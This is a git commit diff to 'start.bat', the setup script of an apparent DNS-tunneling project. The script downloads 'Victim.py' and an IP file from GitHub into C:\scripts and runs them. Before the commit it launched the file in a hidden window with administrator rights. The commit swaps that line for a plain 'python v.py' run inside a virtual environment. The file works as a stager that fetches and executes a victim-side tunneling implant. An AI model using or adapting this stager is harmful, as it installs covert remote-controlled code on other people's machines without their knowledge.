af7c550bde97d9597ab048ce87807317aca0f201
ShacharMarkovich <234shachar@gmail.com>
2021-11-29 16:01:12 +0200

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,5 +1,9 @@
 mkdir C:\scripts
 $env:Path += ';C:\scripts'
+cd C:\scripts
+
+python -m venv env
+.\env\Scripts\Activate.ps1
 
 pip install pyDH
 pip install secrets
@@ -10,5 +14,4 @@ $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/Victim.py","C:\scripts\v.py")
 $WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/ip.txt","C:\scripts\ip.txt")
 
-
-Powershell -windowstyle hidden -Command "Start-Process python v.py -Verb RunAs"
+python v.py
